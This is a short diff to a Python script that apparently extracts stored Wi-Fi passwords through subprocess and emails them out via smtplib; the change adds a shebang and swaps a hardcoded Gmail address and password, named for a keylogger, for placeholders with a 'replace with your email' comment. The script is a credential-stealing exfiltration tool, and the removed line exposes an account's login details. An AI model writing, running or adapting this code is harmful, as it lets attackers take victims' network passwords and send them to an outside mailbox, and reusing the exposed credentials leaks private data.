@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 import subprocess, re, smtplib
 
 class WifiPass:
@@ -48,4 +50,5 @@ def send_email(email,password,message):
 
 msg = WifiPass().execute()
 
-send_email("forkeylogger101@gmail.com","loggerkey101",msg)
+#replace with your email and passwords
+send_email("email","password",msg)
